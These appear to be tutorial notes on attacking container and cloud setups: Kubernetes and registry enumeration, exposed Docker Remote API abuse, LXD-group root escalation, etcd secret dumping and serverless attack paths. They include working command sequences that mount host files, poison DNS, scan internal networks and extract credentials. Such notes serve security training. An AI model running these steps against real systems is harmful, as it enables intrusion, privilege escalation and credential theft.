## 1. Kubernetes Information Gathering

Attackers use `kubectl` (the Kubernetes command-line tool) to interact with the cluster and uncover weaknesses in the containerized environment.

### Common kubectl Commands:
*   **List Pods:** `kubectl get pods`
*   **Describe Pod:** `kubectl describe pod <pod-name>` (fetches detailed configurations).
*   **Dump Logs:** `kubectl logs <pod-name>`
*   **List Services:** `kubectl get services`
*   **Describe Services:** `kubectl describe services`
*   **List Deployments:** `kubectl get deployment`
*   **List Service Accounts:** `kubectl get serviceaccounts`

### Enumerating Registries
Attackers target registries to find outdated images, sensitive environment variables, or hardcoded secrets.
*   **Login to registry:** `docker login <registry-url>`
*   **List Repositories (API):** `curl -s https://hub.docker.com/v2/repositories/<username>/`
*   **List Images (API):** `curl -u <user>:<pass> https://<registry-url>/v2/_catalog`
*   **List Tags:** `curl -u <user>:<pass> https://<registry-url>/v2/<image-name>/tags/list`

## 2. Container Vulnerability Scanning

Container images may contain vulnerable open-source frameworks. Attackers scan them to find entry points.
*   **Trivy:** Automated vulnerability scanner for OS packages (Alpine, RHEL) and app dependencies (npm, yarn).
    *   `trivy <target> [--scanners <scanner1,scanner2>] <subject>`
*   **Sysdig:** Integrates with CI/CD pipelines and Kubernetes admission controllers to continuously check for CVEs at runtime.
*   **Other Tools:** Kubescape, kube-hunter, kubeaudit, KubiScan, Krane, Anchore, Clair.

## 3. Exploiting Docker Remote API

If the Docker Remote API is exposed, attackers can launch botnets, mine cryptocurrency, or compromise the internal network.

### Retrieving and Manipulating Host Files
Attackers can mount the host's root filesystem into a malicious container to edit host files.
1.  `docker -H <Remote IP:Port> pull alpine`
2.  `docker -H <Remote IP:Port> run -t -d alpine`
3.  **Execute commands:** `docker -H <Remote IP:Port> exec modest_goldstine ls`
4.  **Mount Host `/etc`:** `docker -H <Remote IP:Port> run -t -d -v /etc:/tmp/etc alpine`
5.  **Modify Host files:** Use the container to write to `/tmp/etc/hosts`, thereby poisoning the underlying host's DNS resolution.

### Scanning the Internal Network
By attaching a container to the Docker network bridge, attackers can pivot and scan the internal network:
*   `docker -H <docker host> run --network=host --rm marsmensch/nmap -ox <IP Range>`

### Retrieving Credentials & Querying Databases
*   **View Env Variables:** `docker -H <Remote IP:Port> exec -i <container_name> env` (often reveals `MYSQL_ROOT_PASSWORD`).
*   **Execute SQL Queries:** `docker -H <host> exec -i <mysql_container> mysql -u root -p <password> -e "show databases"`

## 4. LXD/LXC Container Group Privilege Escalation

If a user belongs to the `lxd` group, they can escalate privileges to `root` on the host machine because the group has full control over container creation.

1.  **Create an Alpine Image:** Download the `alpine.yaml` config and build it using `distrobuilder`.
    *   `sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18`
2.  **Import to LXD:** `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`
3.  **Create Privileged Container:** `lxc init alpine privesc -c security.privileged=true`
4.  **Mount Host Root Disk:** `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
5.  **Start and Execute:** `lxc start privesc` followed by `lxc exec privesc /bin/sh`. You now have root access to the host mounted at `/mnt/root`.

## 5. Post Enumeration on Kubernetes etcd

`etcd` is the distributed key-value store for Kubernetes. Gaining access to `etcd` is equivalent to gaining root access to the entire cluster.
*   **Find etcd server:** `# ps -ef | grep apiserver`
*   **Enumerate Secrets:** Use `etcdctl` with the API server's certificates to dump the registry.
    *   `ETCDCTL_API=3 ./etcdctl --cacert=... --key=... --endpoints=https://127.0.0.1:2379 get /registry/ --prefix | grep -a '/registry/secrets/'`
*   **Decode Keys:** `... get /registry/secrets/... | ./auger decode -o yaml`

## 6. Serverless Application Hacking

Serverless functions (e.g., AWS Lambda) run without managed servers but are still vulnerable to application-level attacks (DDoS, Command Injection, XSS).

### Black-Box Scenario
Attackers have no prior information about the environment.
1.  Access a misconfigured S3 bucket with no authentication.
2.  Upload malicious files.
3.  The upload triggers a Lambda function (which calculates tags/hashes).
4.  If the Lambda is vulnerable (e.g., Command Injection via file metadata), the attacker exfiltrates the temporary IAM cloud credentials to escalate privileges.

### White-Box Scenario
Attackers hold prior information (e.g., stolen credentials).
1.  Obtain user credentials via phishing.
2.  Enumerate roles and focus on specific misconfigured S3 buckets.
3.  List Lambda functions using the compromised credentials.
4.  Download the Lambda source code (`aws lambda get-function`).
5.  Analyze the code for vulnerabilities (like hardcoded secrets or poor input validation) and execute a targeted exploit.
